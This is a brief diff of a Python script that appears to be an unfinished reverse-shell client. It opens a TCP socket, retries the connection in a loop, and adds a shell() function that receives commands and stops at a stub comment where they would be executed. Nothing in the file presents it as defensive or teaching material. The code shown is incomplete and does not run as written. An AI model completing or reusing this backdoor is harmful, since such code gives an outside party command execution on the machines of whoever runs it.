@@ -1,7 +1,7 @@
 import socket
 import time
 
-s = socket.socket()
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 def connection():
     while True:
@@ -14,10 +14,10 @@ def connection():
             except:
                 connection()
 
-
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection()
-
-
-
+def shell():
+     while True:
+          command = recv()
+          if command == 'exit':
+               break
+          else:
+               #excute the command
